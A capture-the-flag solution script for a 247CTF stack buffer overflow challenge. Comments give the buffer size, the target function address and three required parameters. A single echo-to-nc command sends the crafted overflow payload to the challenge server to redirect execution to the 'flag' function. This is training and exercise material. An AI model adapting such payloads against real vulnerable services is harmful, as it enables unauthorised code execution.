# Stack buffer overflow on function 'chall' at 0x080485fd. #
# Goal: overwrite return address (EBP+4) to get the function 'flag' at 0x08048576 to execute while also passing the required parameters for the function #
# Param 0: 0x1337 #
# Param 1: 0x247 #
# Param 2: 0x12345678 #
# Buffer size: 132 #
# Padding: 0 #
# Total: 132 #

echo -ne "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabbbb\x76\x85\x04\x08bbbb\x37\x13\x00\x00\x47\x02\x00\x00\x78\x56\x34\x12\n" | nc a0a90fb28e9f66b3.247ctf.com 50234
